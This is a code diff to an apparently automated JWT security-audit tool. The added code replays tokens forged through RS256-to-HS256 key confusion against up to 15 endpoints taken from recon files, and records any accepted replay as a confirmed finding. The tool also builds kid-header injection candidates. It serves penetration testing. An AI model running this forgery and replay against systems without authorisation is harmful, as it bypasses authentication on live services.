@@ -7846,7 +7846,35 @@ def run_jwt_audit(domain: str) -> bool:
             forged = jwt_kid_injection.try_rs256_to_hs256(token, jwks_keys)
             if forged:
                 results.append(f"## JWKS-sourced RS256->HS256 forged token\n{forged}\n")
-                log("info", f"JWT {i+1}: JWKS-sourced HS256-confusion token forged — replay against a live endpoint to confirm")
+                # friends full-tool review F7: actually REPLAY the forged token against
+                # candidate authenticated endpoints (confirm_replay's conservative 3-way
+                # baseline). Only a real acceptance becomes a finding; otherwise it stays
+                # a manual-review lead. Bounded + fail-closed, so no hang / fabrication.
+                replay_targets = []
+                try:
+                    for _un in ("api_endpoints.txt", "with_params.txt"):
+                        _uf = os.path.join(recon_dir, "urls", _un)
+                        if os.path.isfile(_uf):
+                            with open(_uf, errors="replace") as _f:
+                                replay_targets += [l.strip() for l in _f
+                                                   if l.strip().startswith("http")]
+                        if len(replay_targets) >= 15:
+                            break
+                    replay_targets = replay_targets[:15]
+                except OSError:
+                    replay_targets = []
+                hit = jwt_kid_injection.confirm_replay_any(
+                    jwt_client, replay_targets, forged, token) if replay_targets else None
+                if hit:
+                    endpoint, detail = hit
+                    log("crit", f"JWT {i+1}: RS256->HS256 key confusion CONFIRMED on {endpoint} — {detail}")
+                    with open(os.path.join(jwt_dir, "jwt_confirmed.txt"), "a") as _cf:
+                        _cf.write(f"[JWT-KEY-CONFUSION-CONFIRMED] {endpoint} :: "
+                                  f"RS256->HS256 JWKS confusion — forged token accepted ({detail})\n")
+                    results.append(f"## RS256->HS256 CONFIRMED via replay on {endpoint}\n{detail}\n")
+                else:
+                    log("info", f"JWT {i+1}: JWKS-sourced HS256-confusion token forged — "
+                                f"no replay confirmation ({'no candidate endpoints' if not replay_targets else 'not accepted'}); manual replay lead")
         kid_candidates = jwt_kid_injection.build_kid_injection_candidates(token)
         if kid_candidates:
             results.append(f"## kid-header injection candidates\n{kid_candidates}\n")
